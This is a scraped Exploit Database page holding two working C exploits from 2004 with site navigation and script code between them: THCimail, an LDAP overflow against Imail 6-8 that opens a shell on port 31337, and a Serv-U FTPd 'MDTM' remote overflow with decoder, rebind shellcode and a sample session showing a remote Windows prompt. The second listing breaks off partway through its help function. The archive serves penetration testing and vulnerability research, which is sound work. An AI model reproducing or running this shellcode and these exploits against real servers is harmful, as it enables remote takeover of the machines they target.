                                 *//*                                                                                              *//* Bug was found by idefense or some idefense slaves ;)                 *//* http://www.idefense.com/application/poi/display?id=74&type=vuln *//*                                                                                              *//* compile with MS Visual C++ : cl THCimail.c                                  *//*                                                                                              *//* At least some greetz fly to : THC, Halvar Flake, FX, gera, MaXX,    *//* dvorak, scut, stealth, FtR and Random                                       *//********************************************************/#include <stdio.h>#include <stdlib.h>#include <string.h>#include <winsock2.h>#pragma comment(lib, "ws2_32.lib")char *WIN2KEN = "\xc4\x2a\x02\x75";char *WIN2KPG = "\xc4\x2a\xf9\x74";char *WINXPSP1G = "\xfe\x63\xa1\x71";#define jumper "\xeb\x06\x4a\x43"char ldapshit[] = "\x30\x82\x0a\x3d\x02\x01\x01\x60\x82\x01\x36\x02\xff\xff\xff\xff\x20";char shellcode[] ="\x8b\x7c\x24\xfc\x83\xc7\x21\x33\xc9\xb2\x8f\x66\x81\xc1\x02""\x02\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7\x64\xac\xf5\xe6\x8d""\x8a\xe3\xd6\x77\x92\x13\x51\x03\x5e\xc3\xff\x5b\x8c\x7f\xa8""\xaf\xaf\xbf\x87\xd8\xdc\xbd\xd0\xbc\xbd\xa1\xcb\xc3\xc3\x8e""\x64\x8a\x67\x76\x70\x70\x70\xd2\x0c\x62\xa5\xe5\xbf\xd6\xeb""\x04\x8e\x04\xcf\x83\x04\xff\x93\x22\x04\xf7\x87\x02\xd0\xb3""\x04\x94\x8e\x74\x04\xd4\xf7\x8e\x74\x04\xc4\x93\x8e\x76\x04""\xdc\xab\x8e\x75\xdc\xde\xdd\x04\xd4\xaf\x8e\x74\xbe\x46\xce""\xbe\x4f\x16\x04\xbb\x04\x8e\x71\x23\xbe\x4d\x5e\x6d\x0b\x4f""\xfa\x78\x80\x39\xca\x8a\x02\xcb\xca\x8b\xe9\xb6\x9f\xfa\x6e""\xe9\xbe\x9f\xd5\xd7\xd1\xd9\xdf\xdd\xa4\xc1\x9f\xce\x80\x38""\x83\xc5\x04\x8b\x07\x8e\x77\x80\x39\xc2\x8a\x06\xcb\x02\x57""\x71\xc2\x8a\xfa\x31\x71\xc2\x8b\xfb\xae\x71\xc2\xad\x02\xd2""\x97\xdc\x70\x5f\x06\x48\xe5\x8b\xd7\x07\xca\x8a\x0f\xca\xf8""\x85\x02\xd2\xfb\x0f\xe4\xa9\x9b\x66\xf7\x70\x70\x70\x06\x41""\xbe\x54\xdc\xdc\xdc\xdc\xd9\xc9\xd9\x70\x5f\x18\xda\xd7\xe9""\x06\xbf\xe5\x9f\xda\xd8\x70\xda\x5b\xc1\xd9\xd8\x70\xda\x43""\xdc\xda\xd8\x70\xda\x5f\x18\x02\xca\x07\xdf\x70\xda\x6b\xda""\xda\x70\xda\x67\x02\xcb\x8a\x83\x1b\xdc\xe7\xa1\xea\xf7\xea""\xe7\xd3\xec\xe2\xeb\x1b\xbe\x5d\x02\xca\x43\x1b\xd8\xd8\xd8""\xdc\xdc\x71\x49\x8e\x7d\xdd\x1b\x02\xca\xf7\xdf\x02\xca\x07""\xdf\x3e\x87\xdc\xdc\xe5\x9f\x71\x41\xdd\xdc\xdc\xdc\xda\x70""\xda\x63\xe5\x70\x70\xda\x6f";void usage();void shell(int sock);int main(int argc, char *argv[]){unsigned int i,sock,sock2,addr,os,ver,rc,IMAILVER;unsigned char *finalbuffer,*crapbuf1,*crapbuf2;unsigned int IMAIL6_7=60;unsigned int IMAIL_8=68;struct sockaddr_in mytcp;struct hostent * hp;WSADATA wsaData;printf("\nTHCimail v0.1 - Imail LDAP exploit\n");printf("tested on Imail 6-8\n");printf("by Johnny Cyberpunk (jcyberpunk@thc.org)\n");if(argc<4 || argc>4)usage();ver = (unsigned short)atoi(argv[3]);switch(ver){case 0:IMAILVER = IMAIL6_7;break;case 1:IMAILVER = IMAIL_8;break;default:printf("\nYou entered an illegal version !\n\n");usage();exit(-1);}crapbuf1 = malloc(IMAILVER);memset(crapbuf1,'X',IMAILVER);printf("imailver = %d\n",IMAILVER);crapbuf2 = malloc(2220);memset(crapbuf2,'X',2220);finalbuffer = malloc(2650);memset(finalbuffer,0,2650);printf("\n[*] building buffer\n");strcat(finalbuffer,ldapshit);strcat(finalbuffer,crapbuf1);strcat(finalbuffer,jumper);os = (unsigned short)atoi(argv[2]);switch(os){case 0:strcat(finalbuffer,WIN2KPG);break;case 1:strcat(finalbuffer,WIN2KPG);break;case 2:strcat(finalbuffer,WINXPSP1G);break;default:printf("\nYou entered an illegal OS !\n\n");usage();exit(-1);}strcat(finalbuffer,shellcode);strcat(finalbuffer,crapbuf2);if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){printf("WSAStartup failed !\n");exit(-1);}hp = gethostbyname(argv[1]);if (!hp){addr = inet_addr(argv[1]);}if ((!hp) && (addr == INADDR_NONE) ){printf("Unable to resolve %s\n",argv[1]);exit(-1);}sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);if (!sock){printf("socket() error...\n");exit(-1);}if (hp != NULL)memcpy(&(mytcp.sin_addr),hp->h_addr,hp->h_length);elsemytcp.sin_addr.s_addr = addr;if (hp)mytcp.sin_family = hp->h_addrtype;elsemytcp.sin_family = AF_INET;mytcp.sin_port=htons(389);printf("[*] connecting the target\n");rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));if(rc==0){send(sock,finalbuffer,2650,0);printf("[*] Exploit send successfully ! Sleeping a while ....\n");Sleep(1000);}elseprintf("\nCan't connect to ldap port!\n");if(rc==0){printf("[*] Trying to get a shell\n\n");sock2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);mytcp.sin_port = htons(31337);rc = connect(sock2, (struct sockaddr *)&mytcp, sizeof(mytcp));if(rc!=0){printf("can't connect to port 31337 ;( maybe firewalled ...\n");exit(-1);}shell(sock2);}shutdown(sock,1);closesocket(sock);free(crapbuf1);free(crapbuf2);free(finalbuffer);exit(0);}void usage(){unsigned int a;printf("\nUsage: <Host> <OS> <Imail Version>\n");printf("Sample: THCimail 194.44.55.56 0 1\n\n");printf("OS:\n");printf("0 - Windows 2000 Server english all service packs\n");printf("1 - Windows 2000 Professional german\n");printf("2 - Windows XP SP1 german\n\n");printf("Imail Version:\n");printf("0 - Imail 6+7\n");printf("1 - Imail 8\n");exit(0);}void shell(int sock){int l;char buf[1024];struct timeval time;unsigned long ul[2];time.tv_sec = 1;time.tv_usec = 0;while (1){ul[0] = 1;ul[1] = sock;l = select (0, (fd_set *)&ul, NULL, NULL, &time);if(l == 1){l = recv (sock, buf, sizeof (buf), 0);if (l <= 0){printf ("bye bye...\n");return;}l = write (1, buf, l);if (l <= 0){printf ("bye bye...\n");return;}}else{l = read (0, buf, sizeof (buf));if (l <= 0){printf("bye bye...\n");return;}l = send(sock, buf, l, 0);if (l <= 0){printf("bye bye...\n");return;}}}}// milw0rm.com [2004-02-27]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 158
RhinoSoft Serv-U FTPd Server 3.x/4.x/5.x - 'MDTM' Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRhinoSoft Serv-U FTPd Server 3.x/4.x/5.x - 'MDTM' Remote OverflowEDB-ID:158CVE:2004-0330EDB Verified:Author:SamType:remoteExploit:/Platform:WindowsDate:2004-02-27Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* ex_servu.c - Serv-U FTPD 3.x/4.x/5.x "MDTM" Command remote overflow exploit** Copyright (c) SST 2004 All rights reserved.** Public version** BUG find by bkbll (bkbll@cnhonker.com), cool! :ppPPppPPPpp :D** code by Sam and  2004/01/07*      <chen_xiaobo@venustech.com.cn>*                     <Sam@0x557.org>*** Revise History:*      2004/01/14 add rebind shellcode :> we can bind shellport at ftpd port.*      2004/01/09 connect back shellcode added :)*      2004/01/08 21:04 upgrade now :), we put shellcode in file parameter*       we can attack pacthed serv-U;PPPp by airsupply*  2004/01/08 change shellcode working on serv-u 4.0/4.1/4.2 now*      :D thx airsupply** Compile: gcc -o ex_servu ex_servu.c** how works?* [root@core exp]# ./sv -h 192.168.10.119 -t 3* Serv-U FTPD 3.x/4.x MDTM Command remote overflow exploit* bug find by bkbll (bkbll@cnhonker.com) code by Sam (Sam@0x557.org)** # Connecting......*  [+] Connected.*  [*] USER ftp .*  [*] 10 bytes send.*  [*] PASS sst@SERV-u .*  [*] 17 bytes send.*  [+] login success .*  [+] remote version: Serv-U v4.x with Windows XP EN SP1*  [+] trigger vulnerability !*   [+] 1027 bytes overflow strings sent!*  [+] successed!!***  Microsoft Windows XP [Version 5.1.2600]*  (C) Copyright 1985-2001 Microsoft Corp.**  [Sam Chen@SAM C:\]#*** some thanks/greets to:* bkbll (he find this bug :D), airsupply, kkqq, icbm* and everyone else who's KNOW SST;P* http://0x557.org*/#include <stdio.h>#include <unistd.h>#include <stdarg.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <netinet/tcp.h>#include <arpa/inet.h>#include <netdb.h>#include <stdlib.h>#include <errno.h>#include <string.h>#include <assert.h>#include <fcntl.h>#include <sys/time.h>#define VER "v5.0"#define clearbit(buff)          bzero(buff, sizeof (buff));#define padding(buff, a)        memset(buff, a, sizeof (buff));#define MAX_LEN         2048#define MAX_NUM         4int     x = 0, port = 21, shellport;char    pass[20], user[20];struct archs {char            *desc;unsigned int    magic;}architectures[] = {{"Serv-U v3.x/4.x/5.x  with Windows 2K CN",   //winmm.dll0x77535985},{"Serv-U v3.x/4.x/5.x  with Windows 2K BIG5 version",   //winmm.dll0x77531790},{"Serv-U v3.x/4.x/5.x  with Windows 2K EN",0x77575985},{"Serv-U v3.x/4.x/5.x  with Windows XP CN SP1",0x76b12f69},{"Serv-U v3.x/4.x/5.x  with Windows XP EN SP1",0x76b42a3a}};char decoder [] =/* 36 bytes cool decoder by airsupply :) */"\x90\x90\x90\x5E\x5F\x5B\xBE\x52\x52\x49\x41\x46\xBF\x52\x52\x31""\x41\x47\x43\x39\x3B\x75\xFB\x4B\x80\x33\x99\x39\x73\xFC\x75\xF7""\xFF\xD3\x90\x90";/* fork + rebind shellcode  by airsupply (one way shellcode) */char    shellcode [] ="\x53\x52\x49\x41"/*port offset 120 + 4*/"\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12\xD9\x85\x12\x99\x12\xD9""\x91\x18\x75\x19\x98\x99\x99\x12\x65\x12\x76\x32\x70\x8B\x9B\x99""\x99\xC7\xAA\x50\x28\x90\x66\xEE\x65\x71\xB9\x98\x99\x99\xF1\xF5""\xF5\x99\x99\xF1\xAA\xAB\xB7\xFD\xF1\xEE\xEA\xAB\xC6\xCD\x66\xCC""\x9D\x32\xAA\x50\x28\x9C\x66\xEE\x65\x71\x99\x98\x99\x99\x12\x6C""\x71\x94\x98\x99\x99\xAA\x66\x18\x75\x09\x98\x99\x99\xCD\xF1\x98""\x98\x99\x99\x66\xCF\xB5\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF""\xA9\x12\x41\xCE\xCE\xF1\x9B\x99\x8C\x5B\x12\x55\xCA\xC8\xF3\x8F""\xC8\xCA\x66\xCF\xAD\xC0\xC2\x1C\x59\xEC\x68\xCE\xCA\x66\xCF\xA1""\xCE\xC8\xCA\x66\xCF\xA5\x12\x49\x10\x1F\xD9\x98\x99\x99\xF1\xFC""\xE1\xFC\x99\xF1\xFA\xF4\xFD\xB7\x10\x3F\xA9\x98\x99\x99\x1A\x75""\xCD\x14\xA5\xBD\xAA\x59\xAA\x50\x1A\x58\x8C\x32\x7B\x64\x5F\xDD""\xBD\x89\xDD\x67\xDD\xBD\xA5\x67\xDD\xBD\xA4\x10\xCD\xBD\xD1\x10""\xCD\xBD\xD5\x10\xCD\xBD\xC9\x14\xDD\xBD\x89\x14\x27\xDD\x98\x99""\x99\xCE\xC9\xC8\xC8\xC8\xD8\xC8\xD0\xC8\xC8\x66\x2F\xA9\x98\x99""\x99\xC8\x66\xCF\x91\xAA\x59\xD1\xC9\x66\xCF\x95\xCA\xCC\xCF\xCE""\x12\xF5\xBD\x81\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81""\x12\xC3\xB9\x9A\x44\x7A\xA9\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65""\xAA\x59\x35\xA3\x79\xED\x9E\x58\x56\x9E\x9A\x61\x72\x6B\xA2\xE5""\xBD\x8D\xEC\x78\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85""\x9A\x44\x12\x9D\x12\x9A\x5C\xC6\xC7\xC4\xC2\x5B\x9D\x99\xC8\x66""\xED\xBD\x91\x34\xC9\x71\x3B\x66\x66\x66\x1A\x5D\x9D\xC0\x32\x7B""\x74\x5A\xF1\xFC\xE1\xFC\x99\xF1\xFA\xF4\xFD\xB7\x10\x3F\xA9\x98""\x99\x99\x1A\x75\xCD\x14\xA5\xBD\xAA\x59\xAA\x50\x1A\x58\x8C\x32""\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD\xBD\xA5\x67\xDD\xBD\xA4\x10""\xDD\xBD\xD1\x10\xDD\xBD\xD5\x10\xDD\xBD\xC9\x14\xDD\xBD\x89\x14""\x27\xDD\x98\x99\x99\xCE\xC9\xC8\xC8\xF3\x9D\xC8\xC8\xC8\x66\x2F""\xA9\x98\x99\x99\xC8\x66\xCF\x91\x18\x75\x99\x9D\x99\x99\xF1\x9E""\x99\x98\x99\xCD\x66\x2F\xD1\x98\x99\x99\x66\xCF\x89\xF3\xD9\xF1""\x99\x89\x99\x99\xF1\x99\xC9\x99\x99\xF3\x99\x66\x2F\xDD\x98\x99""\x99\x66\xCF\x8D\x10\x1D\xBD\x21\x99\x99\x99\x10\x1D\xBD\x2D\x99""\x99\x99\x12\x15\xBD\xF9\x9D\x99\x99\x5E\xD8\x62\x09\x09\x09\x09""\x5F\xD8\x66\x09\x1A\x70\xCC\xF3\x99\xF1\x99\x89\x99\x99\xC8\xC9""\x66\x2F\xDD\x98\x99\x99\x66\xCF\x81\xCD\x66\x2F\xD1\x98\x99\x99""\x66\xCF\x85\x66\x2F\xD1\x98\x99\x99\x66\xCF\xB9\xAA\x59\xD1\xC9""\x66\xCF\x95\x71\x70\x64\x66\x66\xAB\xED\x08\x95\x50\x25\x3F\xF2""\x16\x6B\x81\xF8\x51\xCE\xD6\x88\x68\xE2\x05\x76\xC1\x96\xD8\x0E""\x51\xCE\xD6\x8E\x4F\x15\x07\x6A\xFA\x10\x48\xD6\xA4\xF3\x2D\x19""\xB4\xAB\xE1\x47\xFD\x89\x3E\x44\x95\x06\x4A\xD2\x28\x87\x0E\x98""\x06\x06\x06\x06""\x53\x52\x31\x41";/* new:* tcp connect with no block socket, host to ip.* millisecond timeout, it's will be fast.*;D* 2003/06/23 add by Sam*/int new_tcpConnect (char *host, unsigned int port, unsigned int timeout){int                     sock,flag,pe = 0;size_t                  pe_len;struct timeval          tv;struct sockaddr_in      addr;struct hostent*         hp = NULL;fd_set                  rset;// reslov hostshp = gethostbyname (host);if (NULL == hp) {perror ("tcpConnect:gethostbyname\n");return -1;}sock = socket (AF_INET, SOCK_STREAM, 0);if (-1 == sock) {perror ("tcpConnect:socket\n");return -1;}addr.sin_addr = *(struct in_addr *) hp->h_addr;addr.sin_family = AF_INET;addr.sin_port = htons (port);/* set socket no block*/flag = fcntl (sock, F_GETFL);if (-1 == flag) {perror ("tcpConnect:fcntl\n");close (sock);return -1;}flag |= O_NONBLOCK;if (fcntl (sock, F_SETFL, flag) < 0) {perror ("tcpConnect:fcntl\n");close (sock);return -1;}if (connect (sock, (const struct sockaddr *) &addr,sizeof(addr)) < 0 &&errno != EINPROGRESS) {perror ("tcpConnect:connect\n");close (sock);return -1;}/* set connect timeout* use millisecond*/tv.tv_sec = timeout/1000;tv.tv_usec = timeout%1000;FD_ZERO (&rset);FD_SET (sock, &rset);if (select (sock+1, &rset, &rset, NULL, &tv) <= 0) {//                perror ("tcpConnect:select");close (sock);return -1;}pe_len = sizeof (pe);if (getsockopt (sock, SOL_SOCKET, SO_ERROR, &pe, &pe_len) < 0) {perror ("tcpConnect:getsockopt\n");close (sock);return -1;}if (pe != 0) {errno = pe;close (sock);return -1;}if (fcntl(sock, F_SETFL, flag&~O_NONBLOCK) < 0) {perror ("tcpConnect:fcntl\n");close (sock);return -1;}pe = 1;pe_len = sizeof (pe);if (setsockopt (sock, IPPROTO_TCP, TCP_NODELAY, &pe, pe_len) < 0){perror ("tcpConnect:setsockopt\n");close (sock);return -1;}return sock;}/* rip code, from hsj */int sh (int in, int out, int s){char    sbuf[128], rbuf[128];int     i,ti, fd_cnt,ret=0, slen=0, rlen=0;fd_set  rd, wr;fd_cnt = in > out ? in : out;fd_cnt = s > fd_cnt ? s : fd_cnt;fd_cnt ++;for (;;) {FD_ZERO (&rd);if (rlen < sizeof (rbuf))FD_SET (s, &rd);if (slen < sizeof (sbuf))FD_SET (in, &rd);FD_ZERO (&wr);if (slen)FD_SET (s, &wr);if (rlen)FD_SET (out, &wr);if ((ti = select (fd_cnt, &rd, &wr, 0, 0)) == (-1))break;if (FD_ISSET (in, &rd)) {if((i = read (in, (sbuf+slen),(sizeof (sbuf) - slen))) == (-1)) {ret = -2;break;}else if (i == 0) {ret = -3;break;}slen += i;if (!(--ti))continue;}if (FD_ISSET (s, &wr)) {if ((i = write (s, sbuf, slen)) == (-1))break;if (i == slen)slen = 0;else {slen -= i;memmove (sbuf, sbuf + i, slen);}if (!(--ti))continue;}if (FD_ISSET (s, &rd)) {if ((i = read (s, (rbuf + rlen),(sizeof (rbuf) - rlen))) <= 0)break;rlen += i;if (!(--ti))continue;}if (FD_ISSET (out, &wr)) {if ((i = write (out, rbuf, rlen)) == (-1))break;if (i == rlen)rlen = 0;else {rlen -= i;memmove (rbuf, rbuf+i, rlen);}}}return ret;}int new_send (int fd, char *buff, size_t len){int     ret;if ((ret = send (fd, buff, len, 0)) <= 0) {perror ("new_write");return -1;}return ret;}int new_recv (int fd, char *buff, size_t len){int     ret;if ((ret = recv (fd, buff, len, 0)) <= 0) {perror ("new_recv");return -1;}return ret;}int ftp_login (char *hostName, short port, char *user, char *pass){int     ret, sock;char    buff[MAX_LEN];fprintf (stderr, "# Connecting...... \n");if ((sock = new_tcpConnect (hostName, port, 4000)) <= 0) {fprintf (stderr, "[-] failed. \n");return -1;}clearbit (buff);new_recv (sock, buff, sizeof (buff) - 1);if (!strstr (buff, "220")) {fprintf (stderr, "[-] failed. \n");return -1;}fprintf (stderr, "[+] Connected. \n");sleep (1);fprintf (stderr, "[*] USER %s .\n", user);clearbit (buff);snprintf (buff, sizeof (buff), "USER %s\r\n",  user);ret = new_send (sock, buff, strlen (buff));fprintf (stderr, "[*] %d bytes send. \n", ret);sleep (1);clearbit (buff);new_recv (sock, buff, sizeof (buff) - 1);if (!strstr (buff, "331")) {fprintf (stderr, "[-] user failed. \n%s\n", buff);return -1;}fprintf (stderr, "[*] PASS %s .\n", pass);clearbit (buff);snprintf (buff, sizeof (buff), "PASS %s\r\n", pass);ret = new_send (sock, buff, strlen (buff));fprintf (stderr, "[*] %d bytes send. \n", ret);sleep (1);clearbit (buff);new_recv (sock, buff, sizeof (buff) - 1);if (!strstr (buff, "230")) {fprintf (stderr, "[-] pass failed. \n%s\n", buff);return -1;}fprintf (stderr, "[+] login success .\n");return sock;}void do_overflow (int sock){int             ret, i;unsigned short newport;char    Comand [MAX_LEN] = {0}, chmodBuffer [600], rbuf[256];clearbit (Comand);clearbit (rbuf);clearbit (chmodBuffer);for(i = 0; i < 47; i++)strcat(chmodBuffer, "a");for(i = 0; i < 16; i += 8) {*(unsigned int*)&chmodBuffer[47+i] = 0x06eb9090;*(unsigned int*)&chmodBuffer[51+i] = architectures[x].magic; //0x1002bd78;  //pop reg pop reg ret}newport = htons (shellport)^(unsigned short)0x9999;memcpy (&shellcode[120 + 4], &newport, 2);strcat(chmodBuffer, decoder);fprintf (stderr, "[+] remote version: %s\n", architectures[x].desc);fprintf (stderr, "[+] trigger vulnerability !\n ");strcpy (Comand, "MDTM 20031111111111+");strncat (Comand, chmodBuffer, strlen (chmodBuffer) - 1);strcat (Comand, " ");strcat (Comand, shellcode);strcat (Comand, "hacked_by.sst\r\n");ret =  new_send (sock, Comand, strlen (Comand));fprintf (stderr, "[+] %d bytes overflow strings sent!\n", ret);return;}/* print help messages.* just show ya how to use.*/void showHELP (char *p){int     i;fprintf (stderr, "Usage: %s [Options] \n", p);fprintf (stderr, "Options:\n""\t-h [remote host]\tremote host\n""\t-P [server port]\tserver port\n""\t-t [system type]\tchoice the system type\n""\t-u [user   name]\tlogin with this username\n""\t-p [pass   word]\tlogin with this passwd\n""\t-d [shell  port]\trebind using this port (default: ftpd port)\n\n");printf 